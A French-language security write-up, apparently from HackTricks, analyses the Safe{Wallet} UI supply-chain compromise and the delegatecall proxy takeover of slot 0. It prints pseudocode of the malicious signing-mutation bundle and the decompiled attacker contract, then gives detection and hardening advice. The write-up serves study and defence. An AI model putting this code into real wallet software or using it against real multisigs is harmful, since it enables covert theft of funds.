# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Vue d'ensemble

Une chaîne de vol visant des cold-wallets a combiné une **supply-chain compromise de l'UI web de Safe{Wallet}** avec une **primitive on-chain delegatecall qui a écrasé le pointeur d'implémentation d'un proxy (slot 0)**. Les points clés sont :

- Si une dApp peut injecter du code dans le chemin de signature, elle peut faire en sorte qu'un signataire produise une **EIP-712 signature** valide sur des champs choisis par l'attaquant tout en restaurant les données UI originales pour que les autres signataires ne s'en aperçoivent pas.
- Les proxys Safe stockent `masterCopy` (implementation) à **storage slot 0**. Un delegatecall vers un contrat qui écrit dans le slot 0 « met à niveau » le Safe avec la logique de l'attaquant, donnant le contrôle complet du wallet.

## Off-chain : Mutation ciblée de la signature dans Safe{Wallet}

Un bundle Safe falsifié (`_app-*.js`) ciblait sélectivement des adresses Safe et des adresses de signataires spécifiques. La logique injectée s'exécutait juste avant l'appel de signature :
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Attack properties
- **Context-gated**: des listes blanches codées en dur pour les Safes/signers des victimes ont réduit le bruit et la détection.
- **Last-moment mutation**: les champs (`to`, `data`, `operation`, gas) ont été écrasés immédiatement avant `signTransaction`, puis rétablis, de sorte que les payloads des proposals dans l'UI semblaient bénins alors que les signatures correspondaient au payload de l'attaquant.
- **EIP-712 opacity**: les wallets affichaient des données structurées mais ne décodaient pas le calldata imbriqué ni ne mettaient en évidence `operation = delegatecall`, rendant le message muté effectivement signé à l'aveugle.

### Gateway validation relevance
Les proposals Safe sont soumises au **Safe Client Gateway**. Avant les contrôles renforcés, le gateway pouvait accepter une proposal où `safeTxHash`/signature correspondait à des champs différents du corps JSON si l'UI les réécrivait après signature. Après l'incident, le gateway rejette désormais les proposals dont le hash/la signature ne correspondent pas à la transaction soumise. Une vérification similaire côté serveur du hash devrait être appliquée à toute API d'orchestration de signature.

## On-chain: Delegatecall proxy takeover via slot collision

Les Safe proxies conservent `masterCopy` au **storage slot 0** et délèguent toute la logique vers celui-ci. Parce que Safe supporte **`operation = 1` (delegatecall)**, toute transaction signée peut pointer vers un contrat arbitraire et exécuter son code dans le contexte de stockage du proxy.

Un contrat attaquant a imité un ERC-20 `transfer(address,uint256)` mais a plutôt écrit `_to` dans le slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Chemin d'exécution :
1. Les victimes signent `execTransaction` avec `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe `masterCopy` valide les signatures sur ces paramètres.
3. Le proxy effectue un `delegatecall` vers `attackerContract` ; le corps de `transfer` écrit dans le slot 0.
4. Le slot 0 (`masterCopy`) pointe désormais vers une logique contrôlée par l'attaquant → **prise de contrôle complète du portefeuille et vidage des fonds**.

## Détection et checklist de durcissement

- **Intégrité de l'UI** : pin des assets JS / SRI ; surveiller les diffs de bundle ; considérer l'UI de signature comme faisant partie de la frontière de confiance.
- **Validation au moment de la signature** : hardware wallets avec **EIP-712 clear-signing** ; afficher explicitement `operation` et décoder la calldata imbriquée. Rejeter la signature lorsque `operation = 1` sauf si la politique l'autorise.
- **Vérifications de hash côté serveur** : les gateways/services qui relaient des propositions doivent recalculer `safeTxHash` et valider que les signatures correspondent aux champs soumis.
- **Politiques/listes blanches** : règles de prévalidation pour `to`, les selectors, les types d'actifs, et interdire `delegatecall` sauf pour des flux vérifiés. Exiger un service de politique interne avant de diffuser des transactions entièrement signées.
- **Conception des contrats** : éviter d'exposer des `delegatecall` arbitraires dans les multisig/treasury wallets sauf si strictement nécessaire. Placer les pointeurs d'upgrade loin du slot 0 ou les protéger avec une logique d'upgrade explicite et un contrôle d'accès.
- **Monitoring** : alerter sur les exécutions de `delegatecall` provenant de wallets détenant des fonds de trésorerie, et sur les propositions qui changent `operation` par rapport aux schémas `call` typiques.

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
